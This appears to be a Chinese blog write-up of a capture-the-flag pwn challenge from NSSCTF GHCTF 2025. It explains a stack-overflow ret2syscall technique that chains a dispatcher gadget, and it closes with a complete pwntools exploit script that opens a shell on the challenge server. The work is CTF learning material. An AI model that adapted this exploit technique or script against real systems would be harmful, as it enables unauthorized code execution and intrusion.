---
title: NSSCTF-GHCTF-2025-真会布置栈吗？ 题解
date: 2026-02-23 22:50:00
tags: 
    - stack
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/6544)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-areyou_goodat_hijackstack/checksec.png)

### vmmap

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-areyou_goodat_hijackstack/vmmap.png)

没有 rwx 段， ret2shellcode 比较困难

### IDA

#### start

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-areyou_goodat_hijackstack/start.png)

泄露了栈地址，有栈溢出

#### gadget

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-areyou_goodat_hijackstack/gadget.png)

`xchg` 是交换指令

### 攻击思路

其实就是 ret2syscall ，但是在栈的布局上要下点功夫，可以在一次输入内就完成攻击

布局思路：（其实就是利用 dispatcher 的特性让 rbx 拥有类似 rip 和 rsp 结合体的功能）

```
                            syscall_addr
                dispatcher  xchg_addr
r15             dispatcher  xor_rsi_addr
r13     print1  59          xor_rdx_addr
rbx     rsp↑    [stack]---->[     ]
rdi     print2  [stack]---->"/bin/sh\x00"
rsi     print3  gadget
```

整合一下：

```
                syscall_addr    rsp+0x38
                xchg_addr       rsp+0x30
                xor_rsi_addr    rsp+0x28
                xor_rdx_addr    rsp+0x20
                "/bin/sh\x00"   rsp+0x18
                dispatcher      rsp+0x10
r15             dispatcher      rsp+0x8
r13     print1  59              rsp+0x0
rbx     rsp↑    rsp+0x18
rdi     print2  rsp+0x18
rsi     print3  gadget
```

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./attachment')
else:
	io = remote('node6.anna.nssctf.cn', 28007)

gadget = 0x401017
dispatcher = 0x401011
exchange = 0x40100C
xor_rdx = 0x401021
xor_rsi = 0x401027
syscall = 0x401077

def attack():
	io.recvuntil(b'Y.  )\n')
	stack = u64(io.recv(8))
	log.info(f'stack = {hex(stack)}')
	payload = flat(p64(gadget), 
			p64(stack + 0x18), 
			p64(stack + 0x18), 
			p64(59),
			p64(dispatcher), 
			p64(dispatcher), 
			b'/bin/sh\x00', 
			p64(xor_rdx), 
			p64(xor_rsi), 
			p64(exchange), 
			p64(syscall))
	io.sendafter(b'>> ', payload)
	io.interactive()

attack()
```